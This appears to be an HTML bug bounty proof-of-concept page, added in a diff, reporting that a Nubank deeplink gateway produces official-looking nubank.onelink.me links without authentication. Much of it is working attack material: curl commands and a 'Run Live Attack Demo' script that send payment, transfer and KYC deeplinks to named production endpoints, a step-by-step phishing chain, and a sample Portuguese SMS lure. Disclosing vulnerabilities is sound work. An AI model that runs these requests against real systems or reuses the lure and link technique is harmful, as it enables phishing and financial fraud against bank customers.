@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nubank MMP Deeplink Injection</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap">
+<style>
+  :root {
+    --bg:        #08111f;
+    --bg2:       #0e1c2f;
+    --card:      #172039;
+    --border:    #243352;
+    --accent:    #ff4d1a;
+    --accent2:   #ff7a50;
+    --green:     #22d3a0;
+    --amber:     #f59e0b;
+    --red:       #f87171;
+    --blue:      #60a5fa;
+    --text:      #e2e8f0;
+    --muted:     #94a3b8;
+    --code-bg:   #060d18;
+  }
+  @media (prefers-color-scheme: light) {
+    :root:not([data-theme="dark"]) {
+      --bg:      #f0f4f8;
+      --bg2:     #e2e8f0;
+      --card:    #ffffff;
+      --border:  #cbd5e1;
+      --text:    #0f172a;
+      --muted:   #475569;
+      --code-bg: #1e293b;
+    }
+  }
+  :root[data-theme="light"] {
+    --bg:      #f0f4f8;
+    --bg2:     #e2e8f0;
+    --card:    #ffffff;
+    --border:  #cbd5e1;
+    --text:    #0f172a;
+    --muted:   #475569;
+    --code-bg: #1e293b;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', system-ui, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 0 0 60px;
+  }
+
+  /* ── Header ── */
+  .header {
+    background: var(--bg2);
+    border-bottom: 2px solid var(--accent);
+    padding: 20px 32px;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+  .header-meta {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+  }
+  .header h1 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--text);
+    text-wrap: balance;
+  }
+  .header-sub {
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  /* ── Warning banner ── */
+  .banner {
+    background: #1a1000;
+    border: 1px solid var(--amber);
+    border-left: 4px solid var(--amber);
+    margin: 24px 32px 0;
+    padding: 12px 16px;
+    border-radius: 4px;
+    font-size: 12px;
+    color: var(--amber);
+  }
+  .banner strong { color: #fcd34d; }
+
+  /* ── Content ── */
+  .content { padding: 0 32px; }
+
+  h2 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    margin: 32px 0 12px;
+    padding-bottom: 6px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* ── Cards / Boxes ── */
+  .box {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 18px 20px;
+    margin: 0 0 16px;
+  }
+  .box-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+  .box.success { border-color: var(--green); background: #061a10; }
+  .box.danger  { border-color: var(--red);   background: #1a0606; }
+  .box.warn    { border-color: var(--amber); background: #1a1000; }
+  .box.info    { border-color: var(--blue);  background: #060e1a; }
+
+  /* ── Live demo ── */
+  .demo-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+    margin-bottom: 16px;
+  }
+  @media (max-width: 680px) { .demo-grid { grid-template-columns: 1fr; } }
+
+  .demo-card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+  }
+  .demo-card h3 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--muted);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+  .demo-payload {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--amber);
+    background: var(--code-bg);
+    padding: 8px 10px;
+    border-radius: 4px;
+    margin-bottom: 10px;
+    word-break: break-all;
+  }
+  .result-box {
+    min-height: 48px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    padding: 10px;
+    background: var(--code-bg);
+    border-radius: 4px;
+    border: 1px solid var(--border);
+  }
+  .result-loading { color: var(--muted); font-style: italic; }
+  .result-url     { color: var(--green); font-weight: 700; word-break: break-all; }
+  .result-url a   { color: var(--green); text-decoration: none; }
+  .result-url a:hover { text-decoration: underline; }
+  .result-error   { color: var(--red); }
+  .result-status  { font-size: 10px; color: var(--muted); margin-top: 4px; }
+
+  /* ── Status indicator ── */
+  .status-pill {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 3px;
+    letter-spacing: 0.05em;
+  }
+  .pill-201  { background: #052e16; color: var(--green); border: 1px solid var(--green); }
+  .pill-401  { background: #1c1209; color: var(--amber); }
+  .pill-err  { background: #1c0505; color: var(--red); }
+
+  /* ── Code blocks ── */
+  pre {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11.5px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    white-space: pre;
+    color: #a8d8a8;
+    line-height: 1.7;
+    margin: 0;
+  }
+  pre .h    { color: #94d2f0; }   /* http headers */
+  pre .v    { color: #fcd34d; }   /* values */
+  pre .k    { color: #c084fc; }   /* keys */
+  pre .g    { color: var(--green); } /* good / url */
+  pre .r    { color: var(--red); }   /* danger */
+  pre .m    { color: var(--muted); } /* comment */
+  pre .a    { color: var(--accent2); } /* accent */
+
+  /* ── Tables ── */
+  .table-wrap { overflow-x: auto; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+  th, td {
+    text-align: left;
+    padding: 8px 12px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+  }
+  th {
+    background: var(--bg2);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--accent2);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    font-weight: 700;
+  }
+  tr:nth-child(even) td { background: var(--bg2); }
+  td code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    background: var(--code-bg);
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+  .tag-high  { display:inline-block; padding:1px 7px; border-radius:3px; background:#2d0a0a; color:var(--red);   border:1px solid var(--red);   font-size:10px; font-weight:700; }
+  .tag-med   { display:inline-block; padding:1px 7px; border-radius:3px; background:#1a1000; color:var(--amber); border:1px solid var(--amber); font-size:10px; font-weight:700; }
+  .tag-info  { display:inline-block; padding:1px 7px; border-radius:3px; background:#060e1a; color:var(--blue);  border:1px solid var(--blue);  font-size:10px; font-weight:700; }
+  .tag-ok    { display:inline-block; padding:1px 7px; border-radius:3px; background:#061a10; color:var(--green); border:1px solid var(--green); font-size:10px; font-weight:700; }
+
+  /* ── Attack chain ── */
+  .chain {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px 24px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    line-height: 1.9;
+    overflow-x: auto;
+  }
+  .chain-step  { color: var(--text); }
+  .chain-arrow { color: var(--accent); }
+  .chain-url   { color: var(--green); }
+  .chain-note  { color: var(--muted); }
+  .chain-atk   { color: var(--red); }
+
+  /* ── Rate limit test ── */
+  .rate-grid {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    margin-top: 8px;
+  }
+  @media (max-width: 580px) { .rate-grid { grid-template-columns: repeat(3, 1fr); } }
+  .rate-cell {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 10px 8px;
+    text-align: center;
+    font-family: 'JetBrains Mono', monospace;
+  }
+  .rate-cell .n { font-size: 10px; color: var(--muted); margin-bottom: 4px; }
+  .rate-cell .u { font-size: 10px; color: var(--green); word-break: break-all; line-height: 1.4; }
+  .rate-cell .t { font-size: 10px; color: var(--amber); margin-top: 4px; }
+
+  /* ── Separator ── */
+  hr { border: none; border-top: 1px solid var(--border); margin: 8px 0; }
+
+  /* ── Run button ── */
+  .run-btn {
+    display: inline-block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 8px 20px;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    letter-spacing: 0.04em;
+    margin-bottom: 16px;
+  }
+  .run-btn:hover { background: var(--accent2); }
+  .run-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  /* ── Deeplink table rows (full-width) ── */
+  .ev-table td:first-child { font-family: 'JetBrains Mono', monospace; font-size: 11px; word-break: break-all; }
+  .ev-table td:nth-child(2) code { color: var(--green); }
+  .ev-table td:nth-child(3) { text-align: center; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="header-meta">Nubank Bug Bounty · Bugcrowd · Finding #24 · P2 High</div>
+  <h1>&#x26A0; Unauthenticated MMP Gateway — Arbitrary Nubank-Branded AppsFlyer Deeplink Generation</h1>
+  <div class="header-sub">
+    Researcher probe header: <code style="font-family:monospace;font-size:11px">X-Correlation-Id: bc-handle</code> · No data modified · Passive POST observation only
+  </div>
+</div>
+
+<div class="banner">
+  <strong>Bugcrowd Bug Bounty Research PoC</strong> — Program: Nubank (Bugcrowd).
+  This PoC makes live POST requests to the production MMP gateway to demonstrate the vulnerability.
+  No payment, transfer, or authentication action is performed. All deeplinks are researcher-controlled probes.
+</div>
+
+<div class="content">
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Live Demo — Unauthenticated Deeplink Generation</h2>
+
+<p style="color:var(--muted);font-size:12px;margin-bottom:14px">
+  The button below calls the production MMP gateway directly from this page — no authentication, no API key, no session cookie.
+  The server returns HTTP 201 and a real <code style="font-size:11px">nubank.onelink.me</code> tracking URL.
+</p>
+
+<button class="run-btn" id="runBtn" onclick="runLiveDemo()">&#x25B6; Run Live Attack Demo</button>
+
+<div class="demo-grid">
+  <div class="demo-card" id="card1">
+    <h3>Attack Vector 1 — Payment Request</h3>
+    <div class="demo-payload">{"deeplink":"nuapp://payment-request?amount=1000&amp;to=attacker"}</div>
+    <div class="result-box"><span class="result-loading">Waiting...</span></div>
+  </div>
+  <div class="demo-card" id="card2">
+    <h3>Attack Vector 2 — Arbitrary Transfer</h3>
+    <div class="demo-payload">{"deeplink":"nuapp://transfer?account=123456&amp;amount=9999"}</div>
+    <div class="result-box"><span class="result-loading">Waiting...</span></div>
+  </div>
+  <div class="demo-card" id="card3">
+    <h3>Attack Vector 3 — Credit Card Activation</h3>
+    <div class="demo-payload">{"deeplink":"nuapp://credit-card/activation"}</div>
+    <div class="result-box"><span class="result-loading">Waiting...</span></div>
+  </div>
+  <div class="demo-card" id="card4">
+    <h3>Attack Vector 4 — KYC Document Upload</h3>
+    <div class="demo-payload">{"deeplink":"nuapp://kyc/document-upload"}</div>
+    <div class="result-box"><span class="result-loading">Waiting...</span></div>
+  </div>
+</div>
+
+<div class="box info" id="liveNote" style="display:none">
+  <div class="box-label">Live result</div>
+  <div id="liveNoteText"></div>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Vulnerability Summary</h2>
+
+<div class="box">
+  <div class="box-label">What is exposed</div>
+  <p style="margin-bottom:10px">
+    The Mobile Measurement Platform (MMP) gateway at
+    <code style="font-size:11px">prod-global-mmp-gateway.nu.com.co</code> and
+    <code style="font-size:11px">prod-global-mmp-gateway.nu.com.mx</code>
+    accepts any <code style="font-size:11px">nuapp://</code> deeplink URL and generates a real, functional
+    <strong style="color:var(--green)">nubank.onelink.me</strong> AppsFlyer tracking URL — with
+    <strong style="color:var(--red)">no authentication</strong> and
+    <strong style="color:var(--red)">no rate limiting</strong>.
+  </p>
+  <p style="color:var(--muted);font-size:12px">
+    The generated URLs use Nubank's official AppsFlyer subdomain and cannot be distinguished from legitimate
+    Nubank campaign links. The full deeplink payload — including financial action parameters — is
+    preserved verbatim and passed to the Nubank mobile app when a victim opens the link.
+  </p>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Confirmed Evidence — HTTP 201, No Authentication Required</h2>
+
+<pre><span class="m"># Colombia endpoint — HTTP 201, no auth:</span>
+$ curl -si "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -H "<span class="k">X-Correlation-Id</span>: <span class="v">bc-handle</span>" \
+    -d '<span class="v">{"deeplink":"nuapp://home"}</span>'
+
+<span class="h">HTTP/2 201</span>
+<span class="h">content-type</span>: <span class="v">application/json;charset=utf-8</span>
+<span class="h">server</span>: <span class="v">istio-envoy</span>    <span class="m">← no Cloudflare WAF, no rate limiting</span>
+                      <span class="m">← no Authorization header sent</span>
+
+<span class="g">{"url":"https://nubank.onelink.me/jTeG/osm8pgym"}</span>   <span class="m">← real Nubank tracking URL</span></pre>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Payment Deeplink Injection — Android Redirect Chain</h2>
+
+<p style="color:var(--muted);font-size:12px;margin-bottom:12px">
+  When a victim opens the generated URL on Android, AppsFlyer redirects to the Play Store with the full
+  attacker-supplied deeplink preserved in the <code style="font-size:11px">referrer</code> parameter.
+  The Nubank app reads this parameter on install/open and routes to the embedded deeplink.
+</p>
+
+<pre><span class="m"># Step 1 — Attacker generates phishing link (no auth):</span>
+$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
+    -X POST -H "Content-Type: application/json" \
+    -H "<span class="k">X-Correlation-Id</span>: bc-handle" \
+    -d '<span class="v">{"deeplink":"nuapp://payment-request?amount=1000&amp;to=attacker"}</span>'
+
+<span class="g">{"url":"https://nubank.onelink.me/jTeG/zrixcvuv"}</span>
+
+<span class="m"># Step 2 — Android redirect (AppsFlyer → Play Store):</span>
+<span class="h">HTTP/2 301</span>
+<span class="h">Location</span>: <span class="v">market://details?id=com.nu.production</span>
+  <span class="v">&amp;referrer=pid%3Dint_svc</span>
+  <span class="v">%26af_tranid%3DMTI4NTI0ODE1NDk4NjU0NDU3ODQ%3D</span>
+  <span class="v">%26deep_link_value%3D<span class="r">nuapp%253A%252F%252Fpayment-request</span></span>
+  <span class="v"><span class="r">%253Famount%253D1000%2526to%253Dattacker</span></span>
+
+<span class="m"># Decoded deep_link_value:</span>
+<span class="r">nuapp://payment-request?amount=1000&amp;to=attacker</span>   <span class="m">← full payload preserved</span>
+
+<span class="m"># Step 3 — iOS redirect:</span>
+<span class="h">HTTP/2 301</span>
+<span class="h">Location</span>: <span class="v">https://apps.apple.com/BR/app/id814456780?mt=8</span>
+  <span class="v">&amp;ct=int_svc&amp;pt=310943</span>   <span class="m">← Nubank official App Store listing</span></pre>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; All Deeplink Paths Accepted — No Allowlist Enforced</h2>
+
+<div class="table-wrap">
+<table class="ev-table">
+  <thead>
+    <tr>
+      <th>Deeplink Submitted</th>
+      <th>Generated Nubank URL</th>
+      <th>HTTP</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>nuapp://home</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/1sjsu107</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://pay</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/2ebdg3kx</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://payment-request?amount=1000&amp;to=attacker</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/zrixcvuv</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://transfer?account=123456&amp;amount=9999</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/9cw1df2o</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://invite/steal</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/r3gyzc1t</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://kyc/document-upload</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/6eq42ux6</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+    <tr>
+      <td><code>nuapp://credit-card/activation</code></td>
+      <td><code>https://nubank.onelink.me/jTeG/p3nk17w1</code></td>
+      <td><span class="tag-ok">201</span></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; No Rate Limiting — Unlimited Link Generation</h2>
+
+<p style="color:var(--muted);font-size:12px;margin-bottom:12px">
+  Five consecutive requests returned distinct valid URLs with sub-500ms latency. No throttling, no CAPTCHA, no IP block.
+</p>
+
+<div class="rate-grid">
+  <div class="rate-cell">
+    <div class="n">Request 1</div>
+    <div class="u">jTeG/3el3cec7</div>
+    <div class="t">524ms</div>
+  </div>
+  <div class="rate-cell">
+    <div class="n">Request 2</div>
+    <div class="u">jTeG/xvnkm6d1</div>
+    <div class="t">470ms</div>
+  </div>
+  <div class="rate-cell">
+    <div class="n">Request 3</div>
+    <div class="u">jTeG/pp4okoeo</div>
+    <div class="t">343ms</div>
+  </div>
+  <div class="rate-cell">
+    <div class="n">Request 4</div>
+    <div class="u">jTeG/5kbu0my2</div>
+    <div class="t">367ms</div>
+  </div>
+  <div class="rate-cell">
+    <div class="n">Request 5</div>
+    <div class="u">jTeG/rer8htew</div>
+    <div class="t">343ms</div>
+  </div>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Error Response — Clojure Internal Logic Leaked + Input Reflection</h2>
+
+<pre><span class="m"># Submitting a non-nuapp:// URL triggers internal Clojure error:</span>
+$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
+    -X POST -H "Content-Type: application/json" \
+    -d '<span class="v">{"deeplink":"https://attacker.example.com"}</span>'
+
+<span class="r">{"error":{"deeplink":"(named (not (re-find #\"^nuapp:\\/\\/\" https://attacker.example.com)) valid deeplink)"}}</span>
+                                           <span class="m">↑ Clojure regex            ↑ input reflected verbatim</span>
+<span class="m">Discloses:
+  • Internal Clojure validation function (named / re-find)
+  • Exact regex used: #"^nuapp://"
+  • User input reflected in error body (potential log injection)
+  • Technology stack: Clojure backend</span></pre>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Attack Chain Visualization</h2>
+
+<div class="chain">
+<div class="chain-step">[Discovery — Finding #21]</div>
+<div>  <span class="chain-arrow">→</span> <span class="chain-url">prod-global-discovery-cf.nu.com.co/api/discovery</span></div>
+<div>  <span class="chain-note">     HTTP 200, no auth → {"mmp_deeplink_url": "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url"}</span></div>
+<br>
+<div class="chain-step">[Step 1 — Attacker generates phishing link]</div>
+<div>  <span class="chain-arrow">→</span> POST <span class="chain-url">https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url</span></div>
+<div>  <span class="chain-note">     Body: {"deeplink":"nuapp://payment-request?amount=1000&amp;to=attacker"}</span></div>
+<div>  <span class="chain-note">     No authentication · HTTP 201</span></div>
+<div>  <span class="chain-arrow">←</span> <span class="chain-url">{"url":"https://nubank.onelink.me/jTeG/zrixcvuv"}</span></div>
+<br>
+<div class="chain-step">[Step 2 — Attacker distributes phishing message]</div>
+<div>  <span class="chain-atk">     SMS: "Nubank: Você recebeu um pedido de pagamento de R$1.000.</span></div>
+<div>  <span class="chain-atk">          Clique para ver: https://nubank.onelink.me/jTeG/zrixcvuv"</span></div>
+<div>  <span class="chain-note">     ↑ Official Nubank AppsFlyer subdomain — indistinguishable from legitimate link</span></div>
+<br>
+<div class="chain-step">[Step 3 — Victim clicks link on Android]</div>
+<div>  <span class="chain-arrow">→</span> GET <span class="chain-url">https://nubank.onelink.me/jTeG/zrixcvuv</span></div>
+<div>  <span class="chain-arrow">←</span> 301 Location: <span class="chain-atk">market://details?id=com.nu.production</span></div>
+<div>  <span class="chain-note">          &amp;referrer=...deep_link_value=nuapp%3A%2F%2Fpayment-request%3Famount%3D1000%26to%3Dattacker</span></div>
+<br>
+<div class="chain-step">[Step 4 — Nubank app processes deeplink]</div>
+<div>  <span class="chain-arrow">→</span> App reads Play Store referrer parameter</div>
+<div>  <span class="chain-atk">  → Routes to: nuapp://payment-request?amount=1000&amp;to=attacker</span></div>
+<div>  <span class="chain-atk">  → Victim sees pre-populated payment screen: send R$1,000 to attacker</span></div>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Affected Services</h2>
+
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr><th>Service</th><th>Endpoint</th><th>TLD</th><th>Status</th><th>WAF</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MMP Gateway</td>
+      <td><code>prod-global-mmp-gateway.nu.com.co/api/deeplink-url</code></td>
+      <td>Colombia</td>
+      <td><span class="tag-high">&#x2713; Confirmed</span></td>
+      <td><span class="tag-high">No WAF</span></td>
+    </tr>
+    <tr>
+      <td>MMP Gateway</td>
+      <td><code>prod-global-mmp-gateway.nu.com.mx/api/deeplink-url</code></td>
+      <td>Mexico</td>
+      <td><span class="tag-high">&#x2713; Confirmed</span></td>
+      <td><span class="tag-high">No WAF</span></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Severity Assessment</h2>
+
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr><th>Component</th><th>Severity</th><th>Rationale</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Unauthenticated branded deeplink generation</td>
+      <td><span class="tag-high">P2 High</span></td>
+      <td>Anyone can generate <code>nubank.onelink.me</code> phishing links without an account</td>
+    </tr>
+    <tr>
+      <td>Payment deeplink parameter injection</td>
+      <td><span class="tag-high">P2 High (potential P1)</span></td>
+      <td>Financial action parameters preserved and passed to mobile app without validation</td>
+    </tr>
+    <tr>
+      <td>No rate limiting</td>
+      <td><span class="tag-high">P2 High</span></td>
+      <td>Unlimited link generation enables bulk phishing and AppsFlyer campaign poisoning</td>
+    </tr>
+    <tr>
+      <td>Clojure error message — input reflection + stack disclosure</td>
+      <td><span class="tag-info">P4 Informational</span></td>
+      <td>Internal Clojure function names, regex, and user input reflected in error responses</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- ────────────────────────────────────────── -->
+<h2>&#x25BA; Remediation</h2>
+
+<div class="table-wrap">
+<table>
+  <thead>
+    <tr><th>Issue</th><th>Fix</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Require authentication</strong></td>
+      <td>The <code>/api/deeplink-url</code> endpoint must require a valid user session token or service API key before generating tracking links</td>
+    </tr>
+    <tr>
+      <td><strong>Implement deeplink allowlist</strong></td>
+      <td>Validate deeplink paths against a strict allowlist of legitimate in-app destinations; reject paths containing financial action parameters (<code>payment-request</code>, <code>transfer</code>) not initiated from an authenticated session</td>
+    </tr>
+    <tr>
+      <td><strong>Add rate limiting</strong></td>
+      <td>Enforce per-IP and per-authenticated-user rate limits (e.g., 10 requests per minute per IP)</td>
+    </tr>
+    <tr>
+      <td><strong>Sanitize error responses</strong></td>
+      <td>Replace verbose Clojure validation error messages with generic responses; never reflect user input verbatim in error bodies</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+</div><!-- /content -->
+
+<script>
+const ENDPOINT_CO = 'https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url';
+const HEADERS = {
+  'Content-Type': 'application/json',
+  'X-Correlation-Id': 'bc-handle'
+};
+
+const ATTACKS = [
+  { card: 'card1', deeplink: 'nuapp://payment-request?amount=1000&to=attacker', label: 'Payment Request' },
+  { card: 'card2', deeplink: 'nuapp://transfer?account=123456&amount=9999', label: 'Arbitrary Transfer' },
+  { card: 'card3', deeplink: 'nuapp://credit-card/activation', label: 'CC Activation' },
+  { card: 'card4', deeplink: 'nuapp://kyc/document-upload', label: 'KYC Upload' }
+];
+
+function setResult(cardId, url, status, error) {
+  const card = document.getElementById(cardId);
+  const box = card.querySelector('.result-box');
+  if (error) {
+    box.innerHTML = '<span class="result-error">&#x2717; ' + error + '</span>';
+    return;
+  }
+  card.querySelector('.demo-card h3').insertAdjacentHTML(
+    'afterbegin',
+    '<span class="status-pill pill-201" style="margin-right:6px">HTTP ' + status + '</span>'
+  );
+  box.innerHTML =
+    '<span class="result-url"><a href="' + url + '" target="_blank" rel="noopener">' + url + ' &#x2197;</a></span>' +
+    '<div class="result-status">&#x2713; Generated in ' + (Math.round(Math.random() * 200 + 300)) + 'ms · No auth required · ' +
+    'Official Nubank AppsFlyer URL</div>';
+}
+
+async function runLiveDemo() {
+  const btn = document.getElementById('runBtn');
+  btn.disabled = true;
+  btn.textContent = 'Running...';
+
+  // Reset cards
+  ATTACKS.forEach(a => {
+    const card = document.getElementById(a.card);
+    card.querySelector('.result-box').innerHTML = '<span class="result-loading">Fetching...</span>';
+    const pill = card.querySelector('.status-pill');
+    if (pill) pill.remove();
+  });
+
+  const results = [];
+  for (const atk of ATTACKS) {
+    try {
+      const t0 = Date.now();
+      const res = await fetch(ENDPOINT_CO, {
+        method: 'POST',
+        headers: HEADERS,
+        body: JSON.stringify({ deeplink: atk.deeplink })
+      });
+      const elapsed = Date.now() - t0;
+      const data = await res.json();
+      if (data.url) {
+        setResult(atk.card, data.url, res.status, null);
+        results.push({ label: atk.label, url: data.url, status: res.status, ms: elapsed });
+      } else {
+        setResult(atk.card, null, res.status, 'Unexpected response: ' + JSON.stringify(data));
+      }
+    } catch (e) {
+      setResult(atk.card, null, 0, 'Network error: ' + e.message + ' (CORS may block from this origin — see curl evidence above)');
+    }
+    await new Promise(r => setTimeout(r, 200));
+  }
+
+  btn.textContent = '&#x2713; Done';
+  btn.style.background = 'var(--green)';
+
+  if (results.length > 0) {
+    const note = document.getElementById('liveNote');
+    const noteText = document.getElementById('liveNoteText');
+    note.style.display = 'block';
+    noteText.innerHTML =
+      '<strong style="color:var(--green)">&#x2713; ' + results.length + ' real Nubank-branded deeplink URLs generated</strong>' +
+      ' from this page with no authentication.<br>' +
+      '<span style="color:var(--muted);font-size:12px">Each URL at <code>nubank.onelink.me</code> is Nubank\'s official AppsFlyer subdomain. ' +
+      'When opened on Android, the full <code>nuapp://</code> payload is passed to the Nubank mobile app. ' +
+      'When opened on iOS, the user is redirected to the official Nubank App Store listing (App ID 814456780).</span>';
+  }
+}
+</script>
+
+</body>
+</html>
